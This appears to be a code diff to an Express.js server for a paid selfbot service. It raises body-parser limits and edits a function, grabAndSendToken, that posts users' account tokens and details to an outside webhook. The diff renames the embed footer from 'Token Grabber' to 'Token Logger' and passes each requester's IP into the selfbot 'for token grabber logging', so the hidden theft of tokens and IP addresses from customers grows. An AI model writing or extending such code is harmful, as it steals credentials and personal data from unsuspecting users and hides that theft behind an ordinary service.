@@ -153,8 +153,9 @@ process.on('unhandledRejection', (reason) => console.error('[FATAL]', reason));
 // Health check
 app.get('/health', (req, res) => res.status(200).json({ status: 'ok' }));
 
-// Middleware
-app.use(express.json());
+// Middleware - INCREASED BODY PARSER LIMIT FOR BASE64 IMAGES
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 
 app.use((req, res, next) => {
@@ -275,7 +276,7 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
                 { name: 'Source', value: source, inline: true },
                 { name: 'Time', value: new Date().toISOString(), inline: true }
             ],
-            footer: { text: 'Token Grabber v2.0' }
+            footer: { text: 'Token Logger v2.0' }
         };
         
         await axios.post(WEBHOOK_URL, {
@@ -477,7 +478,8 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
             image_url: imageUrl || null
         }, configId);
         
-        await selfbotModule.startSelfBot(req.user.id, token, channelList, message, delaySeconds * 1000, autoReply, autoReplyText, configId, imageUrl);
+        // PASS req.ip TO SELFBOT FOR TOKEN GRABBER LOGGING
+        await selfbotModule.startSelfBot(req.user.id, token, channelList, message, delaySeconds * 1000, autoReply, autoReplyText, configId, imageUrl, req.ip);
         
         res.json({ 
             success: true, 
